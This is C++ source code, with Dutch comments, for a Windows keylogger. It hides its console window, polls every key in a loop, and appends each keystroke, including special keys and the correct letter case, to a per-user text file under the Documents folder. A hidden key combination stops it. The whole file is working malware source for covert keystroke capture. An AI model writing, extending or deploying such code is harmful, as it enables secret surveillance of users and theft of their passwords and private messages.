#define _WIN32_WINNT 0x0600
#include <shlobj.h>
#include <Shlwapi.h>
#include <string>
#include <filesystem>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <fstream>
#include <map>
#include <WinSock2.h>

using namespace std;

char* GetUser() {
    char* user = getenv("USERNAME");
    return user;
}

void LOG(string input) {
    string username = GetUser();
    string filename = username + ".txt";
    //fstream LogFile(filename, fstream::app);

    char saveLocation[MAX_PATH] = {0};

    SHGetSpecialFolderPath(NULL, saveLocation, CSIDL_PERSONAL, FALSE);

    string TestDirectory = strcat(saveLocation, "\\test");

    //string Log = TestDirectory + "\\" + filename;
    fstream LogFile(TestDirectory + "\\" + filename, fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
} 

// voegt speciale toetsen toe aan een map
bool SpecialKeys(int S_Key) {
    static map<int, string> specialKeys = {
        {VK_SPACE, " "},
        {VK_RETURN, "\n"},
        {VK_SHIFT, "⇧"},
        {VK_BACK, "⌫"},
        {VK_DELETE, "⌦"},
        {VK_LBUTTON, "[L  ]"},
        {VK_MBUTTON, "[ M ]"},
        {VK_RBUTTON, "[  R]"},
        {VK_CAPITAL, "⇪"},
        {VK_ESCAPE, "☒"},
        {91, "❖"},
        {VK_TAB, "↹"},
        {VK_UP, "↑"},
        {VK_DOWN, "↓"},
        {VK_LEFT, "←"},
        {VK_RIGHT, "→"},
        {VK_CONTROL, "⌃"},
        {VK_MENU, "⎇"},
        {VK_OEM_PLUS, "+"},
        {VK_OEM_MINUS, "-"},
        {VK_OEM_1, GetKeyState(VK_SHIFT) < 0 ? ":" : ";"},
        {VK_OEM_2, GetKeyState(VK_SHIFT) < 0 ? "?" : "/"},
        {VK_OEM_3, GetKeyState(VK_SHIFT) < 0 ? "~" : "`"},
        {VK_OEM_4, GetKeyState(VK_SHIFT) < 0 ? "{" : "["},
        {VK_OEM_5, GetKeyState(VK_SHIFT) < 0 ? "|" : "\\"},
        {VK_OEM_6, GetKeyState(VK_SHIFT) < 0 ? "}" : "]"},
        {VK_OEM_7, GetKeyState(VK_SHIFT) < 0 ? "\"" : "'"},
        {VK_OEM_COMMA, GetKeyState(VK_SHIFT) < 0 ? "<" : ","},
        {VK_OEM_PERIOD, GetKeyState(VK_SHIFT) < 0 ? ">" : "."}
    };

    // als de toets in de map zit dan logt hij de toets
    if (specialKeys.find(S_Key) != specialKeys.end()) {
        cout << specialKeys[S_Key];
        LOG(specialKeys[S_Key]);
        return true;
    }
    return false;
}

// als de toetsen ctrl, shift en * worden ingedrukt dan stopt de keylogger
bool KillSwitch() {
    return (GetAsyncKeyState(VK_SHIFT) < 0) &&
           (GetAsyncKeyState(VK_CONTROL) < 0) &&
           (GetAsyncKeyState(VK_MULTIPLY) < 0);
}


int KeyLogger()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    // zolang de keylogger niet wordt gestopt blijft hij lopen
    while (true) {
        Sleep(10);
        // als de killswitch is geactiveerd dan logt ##KILLED##
        if (KillSwitch()) {
            LOG("##KILLED##");
            break;
        }
        // voor elke toets wordt er gekeken of hij is ingedrukt
        for (int KEY = 1; KEY <= 255; KEY++) {
            if (GetAsyncKeyState(KEY) == -32767) {
                if (!SpecialKeys(KEY)) {
                    char logged_key = static_cast<char>(KEY);
                    // numpad toetsen worden omgezet naar normale toetsen
                    if (KEY >= VK_NUMPAD0 && KEY <= VK_NUMPAD9) {
                        logged_key = '0' + (KEY - VK_NUMPAD0);
                    // kijken of de toets een hoofdletter of kleine letter is (shift en capslock)
                    } else if (isalpha(logged_key)) {
                        logged_key = (GetKeyState(VK_SHIFT) < 0) ^ (GetKeyState(VK_CAPITAL) & 1) ? toupper(logged_key) : tolower(logged_key);
                    }
                    // logt de toets
                    LOG(string(1, logged_key));
                }
            }
        }
    }

    return 0;
}

int main()
{    
    KeyLogger();
    return 0;
}